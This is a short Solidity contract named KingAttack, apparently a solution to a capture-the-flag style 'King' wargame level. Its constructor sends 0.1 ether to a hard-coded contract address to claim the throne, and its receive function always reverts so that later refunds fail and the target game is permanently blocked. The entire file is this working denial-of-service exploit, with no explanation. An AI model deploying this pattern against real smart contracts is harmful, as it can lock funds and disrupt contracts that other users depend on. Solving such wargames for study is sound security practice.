//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract KingAttack {
  constructor() public payable {
    payable(0x828eA74f93a8E9f8561F4C813ed0EB543C6B0ac8).call{gas:1000000, value: 0.1 ether}("");
  }

  receive() external payable {
    revert();
  }
}
